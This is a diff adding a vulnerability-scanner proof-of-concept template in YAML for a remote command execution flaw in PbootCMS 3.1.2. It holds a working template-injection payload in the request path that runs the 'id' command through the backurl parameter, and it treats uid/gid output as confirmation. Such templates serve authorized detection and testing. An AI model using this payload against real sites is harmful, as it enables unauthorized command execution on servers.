@@ -1,0 +1,17 @@
+id: poc-yaml-pbootcms-3.1.2-rce
+info:
+  name: PbootCMS 3.1.2 远程命令执行漏洞
+  severity: high
+  tags:
+  - rce
+  finger: PbootCMS
+  osprey-id: vb_2022_0104
+requests:
+- method: GET
+  path: /?snakin=}{pboot:if((get_lg/*-*/())/**/(get_backurl/*-*/()))}{/pboot:if}&backurl=;id
+  expression: 'contains(body, "uid=") && contains(body, "groups=") && contains(body,
+    "gid=")
+
+    '
+variables: {}
+transport: http
